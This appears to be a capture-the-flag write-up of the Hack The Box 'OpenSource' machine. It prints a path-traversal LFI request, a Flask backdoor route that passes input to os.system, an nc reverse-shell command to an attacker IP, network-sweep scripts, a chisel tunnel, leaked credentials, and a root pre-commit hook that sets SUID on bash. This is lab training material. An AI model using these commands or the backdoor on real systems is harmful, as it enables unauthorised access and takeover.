# OpenSource Writeup

![Opensource](/assets/img/HTB-opensource/OpenSource.png)

# Summary
This machine's theme is that it is an opensource file transfer app, where one user can upload a file and they would get a URL they can share with others to download. Vulnrabilites in the code made it possible for an attacker to upload a backdoor and get command execution on a Docker container. Where the attacker could then pivot to a filtered Gitea service and log in to one of the users using found credentials in a previous commit in the git repository. Privilage escaltion revolves around a custom script ran as root to commit and push the home directory of the comprised user, that can be exploited by adding a malicious pre-commit hook.

# Enumration

## Port scanning 
```bash
nmap -sC -sV -o nmap/basic 10.10.11.164
```
Port `80` and port `22` are open which are just `ssh` and `http`, but there is another port `3000` that is filtered by a firewall.

> Website running in development mode with python debugger Werkzeug/2.1.2

That means we could access /console for code execution if we knew the pincode.. or generated it.

[Werkzeug Pin code generation](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected) is possible but we are gonna need access to files on the machine.


## Website
Web page promoting their open source file sharing app.
![Web page](/assets/img/HTB-opensource/WebPage.png)
We have the option to download the source code and another option to go to the running app in `/upcloud`
![upcloud app](/assets/img/HTB-opensource/Upcloud.png)
> App has upload functionality. possible LFI?



## Git commits
Since this is a git repo we can check for any sensitive files or secrets that were commited previously. A good tool for this is [gitkraken](https://www.gitkraken.com/).
> Found creds in a previous commit in the dev branch

`dev01:Soulless_Developer#2022`
```json
{
  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
  "http.proxyStrictSSL": false
}
```
Found in .vscode/settings.json
commit: a76f8f75f7a4a12b706b0cf9c983796fa1985820
In the dev branch.

## Testing for local file inclusion (LFI)
* Uploading a file stores it in `/uploads/{FILE}`
* Tried navigating to `/uploads/../../../../etc/passwd` but it gets filtered

Since we have the source code we can see how it is being filtered.
```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")
```
This function sanitizes the file name from the users post request (uploading a file).

We can see that it only filters `../`

And if we check out how the path is constructed in `views.py`. We see that it just uses `os.path.join()`

```python
@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name) # Vulnerable line
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')
```
And that is vulnerable because, if we looked at how `os.path.join()` works
![path vuln](/assets/img/HTB-opensource/os_path_vuln.png)

We can see that if we add a `/` to any argument it will ignore all the arguments that came before and start from the argument that starts with `/`.

So that means we could control the file path and bypass the LFI filter by just adding a `/` making it an absolute path.
```shell
curl http://opensource.htb/uploads/..%2f%2fetc/passwd
```
![passwd](/assets/img/HTB-opensource/etc-passwd.png)

This does return `/etc/passwd` from the target machine.

> Using this LFI I have tried generating the werkzueg pin code but I could not get that to work.

---
# Foothold
* Found some cronjob, but there are no executable scripts to modify.

* We have file read and file upload so what is stopping us from changing the source code on the server to add our own vulnerable code to get RCE

```python
import os
...

@app.route('/vymvn', methods=['POST'])
def shell():
    cmd = request.form['text']
    processed_cmd = os.system(cmd)
    return processed_cmd
```
added this function to `views.py` which will take any data we send with as `POST` request and process it as a command and send it back. Basically making ourselves a backdoor.

Now we need to upload `views.py` but uploading it normally will place it in `/uploads` and that would be useless.

We can intercept the upload request with `burpsuite` and use the same method we used to bypass LFI filter to navigate to `/app/app/views.py`
![Intercepting request](/assets/img/HTB-opensource/burp.png)
![success](/assets/img/HTB-opensource/upload_success.png)
## Testing RCE
Sending a `POST` request to `/vymvn` using curl:
```shell
curl -X POST http://opensource.htb/vymvn -d "text=id"
```
![RCE test](/assets/img/HTB-opensource/RCE_test.png)
* **We have RCE!**

as root?

## Getting a reverse shell

Setting up listener:
```shell
nc -lvnp 6666
```
Sending reverse shell command:
```bash
curl -X POST --data "text=nc 10.10.14.27 6666 -e /bin/ash" opensource.htb/vymvn
```
> We know the shell is `/bin/ash` from the `/etc/passwd` file we got previously.
{: .prompt-tip }

![reverse shell](/assets/img/HTB-opensource/revshell.png)
After exploring the machine we can quickly realize that we are in a `Docker` container.

## Network enumration 
* The docker instance runs on its own interface (probably `docker0`)
* The docker interface has the network ip `172.17.0`

* Wrote a quick shell script to ping sweep the network and see who is up.

```shell
#!/bin/bash

for host in $(seq 0 255); do
	    ping -c 1 172.17.0.$host | grep "bytes from" | cut -d " " -f 4 &
done
```

We can see hosts from `.1` to `.9` are up.

Wrote another script to scan the ports on these hosts.


```shell
#!/bin/bash

NETWORK=$1

for host in $(seq 1 9)
do
	for port in $(seq 1 4000)
	do
		r=$(nc -zv -w 1 $NETWORK.$host $port)
		if [[ $r == *"succeeded"* ]]; then
				echo $r
		fi
	done
done
```

The output:
```
172.17.0.1 (172.17.0.1:22) open
172.17.0.1 (172.17.0.1:80) open
172.17.0.1 (172.17.0.1:3000) open
172.17.0.2 (172.17.0.2:80) open
172.17.0.3 (172.17.0.3:80) open
172.17.0.4 (172.17.0.4:80) open
172.17.0.5 (172.17.0.5:80) open
172.17.0.6 (172.17.0.6:80) open
172.17.0.7 (172.17.0.7:80) open
172.17.0.8 (172.17.0.8:80) open
172.17.0.9 (172.17.0.9:80) open
```

Since `172.17.0.1` is the network gateway and the ports open on it match the ports in the nmap scan we can confirm that it is the host machine.

Port 3000 is running an HTTP server and we can connect to it from the docker container because it is inside the network and not filtered by a firewall.

Now we can port forward/tunnel port 3000 to our machine and access it with the browser.
## Tunneling in
Found tunneling tool [chisel](https://github.com/jpillora/chisel) which allowed me to create a tunnel to `172.17.0.1:3000` with reverse port forwarding.

This was done by:
* Starting a chisel server on attack machine:
```bash
chisel server --reverse --port 9999
```
* Connecting from victim machine
```bash
chisel client 10.10.14.57:9999 R:3000:172.17.0.1:3000
```

And now I could access port 3000 on the box by simply going to `localhost:3000` on my attacker machine!

> What happend here is the client connected to the server and forwarded `172.17.0.1:3000` to `10.10.14.57:3000` which is my machine.
{: .prompt-info}

Navigating to it we find that it is running `gitea` which is like github but hosted locally.

Signing in with the creds found before. We find a backup folder with a private ssh key.

Stole that key and connected to user dev01
```shell
ssh -i dev01.key dev01@opensource.htb
```

> **User pwned!**

---

# Privilege Escalation

> Googling the version of gitea we are running returns that it is vulnerable to privilege escalation (CVE-2022-30781) but that was a rabbit hole.
{: .prompt-tip}

## Checking procceses
Dropped [pspy](https://github.com/DominicBreuker/pspy) and ran for a while to check what proccess are being ran.

We can notice that there is a custom script ran by root that is commiting and pushing the home directory of `dev01`. We can't modify this script becuase we don't have write permissions on it.

Since the commiting is done by root we can add a pre-commit hook in `.git/hooks/pre-commit`. We enable this hook by renaming `.git/hooks/pre-commit.sample` and removing the `.sample` from the end.

> Hooks are scripts that run automatically with any git action like commit, push.. etc.
{: .prompt-info}

The pre-commit script will be executed by root before commiting.


Injected `chmod +s /bin/bash` into `.git/hooks/pre-commit` which made bash an `SUID` means it will run bash as root and maintain the UID and GID of root, effectively making us the root user.
```shell
bash -p
```
![root](/assets/img/HTB-opensource/root.png)
* **Root pwned!**

